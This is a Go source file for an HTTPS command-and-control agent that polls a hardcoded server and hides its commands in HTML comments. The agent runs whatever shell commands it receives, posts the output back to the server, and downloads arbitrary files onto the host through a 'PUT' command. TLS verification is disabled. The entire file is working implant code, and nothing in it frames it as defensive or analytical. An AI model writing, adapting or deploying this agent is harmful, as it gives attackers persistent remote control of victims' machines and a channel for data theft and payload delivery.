package main

// HTTPS Agent for Command and Control communication
// This agent connects to a C2 server and executes commands

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	usr "os/user"
	"regexp"
	"strings"
	"time"
)

const (
	server     = "https://192.168.93.133:4443" // C2 server URL
	beaconFreq = 20 * time.Second              // How often to check for commands
)

var agentID string // Unique identifier for this agent

func deriveAgentID() string {
	// Generate a unique agent ID based on hostname and username
	host, _ := os.Hostname()
	candidate := strings.ToLower(strings.TrimSpace(host))
	if candidate == "" {
		candidate = "unknown"
	}
	// Get current username cross-platform
	username := ""
	if u, err := usr.Current(); err == nil {
		username = u.Username
	}
	if username == "" {
		username = os.Getenv("USER")
	}
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	username = strings.ToLower(strings.TrimSpace(username))
	if username == "" {
		username = "user"
	}
	// Windows may include DOMAIN\\User; keep only right side
	if strings.Contains(username, "\\") {
		parts := strings.Split(username, "\\")
		username = parts[len(parts)-1]
	}
	// Combine host-user to create unique ID
	combined := candidate + "-" + username
	// Allow only a-z, 0-9, underscore, hyphen; replace others with '-'
	re := regexp.MustCompile(`[^a-z0-9_-]`)
	combined = re.ReplaceAllString(combined, "-")
	return combined
}

// HTTP client configured to skip SSL verification (dev only!)
var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // dev only!
	},
}

func fetchTask() string {
	// Check with C2 server for new commands
	resp, err := client.Get(server + "/about?id=" + agentID)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	// Look for <!--cmd:...--> in HTML response
	re := regexp.MustCompile(`<!--cmd:(.*?)-->`)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 1 {
		return match[1] // Return the command
	}
	return "" // No command found
}

func sendResponse(result string) {
	// Send command execution results back to C2 server
	data := url.Values{}
	data.Set("id", agentID)
	data.Set("msg", result)

	client.PostForm(server+"/contact", data)
}

func execute(cmd string) string {
	// Execute commands or handle special operations like file downloads
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}
	// Handle PUT command for file downloads
	if len(parts) >= 1 && strings.ToUpper(parts[0]) == "PUT" {
		if len(parts) < 3 {
			return "PUT usage: PUT <url> <dest_path>"
		}
		return handlePut(parts[1], strings.Join(parts[2:], " "))
	}
	// Execute regular shell commands
	out, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
	if err != nil {
		return err.Error() + ": " + string(out)
	}
	return string(out)
}

func handlePut(fileURL string, destPath string) string {
	// Download a file from URL and save it to the specified path
	resp, err := client.Get(fileURL)
	if err != nil {
		return "download error: " + err.Error()
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Sprintf("download failed: status %d", resp.StatusCode)
	}
	// Ensure parent directories exist
	if err := os.MkdirAll(dirOf(destPath), 0755); err != nil {
		// Try 0755, cross-platform; ignored on Windows
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "read error: " + err.Error()
	}
	if err := os.WriteFile(destPath, data, 0644); err != nil {
		return "write error: " + err.Error()
	}
	return "PUT ok: " + destPath
}

func dirOf(path string) string {
	// Extract directory path from a file path (cross-platform)
	idx := strings.LastIndexAny(path, "/\\")
	if idx <= 0 {
		return "."
	}
	return path[:idx]
}

func main() {
	// Main agent loop - continuously check for commands and execute them
	agentID = deriveAgentID()
	for {
		// Check for new commands from C2 server
		task := fetchTask()
		if task != "" {
			// Execute command and send result back
			result := execute(task)
			sendResponse(result)
		}
		// Wait before next check
		time.Sleep(beaconFreq)
	}
}
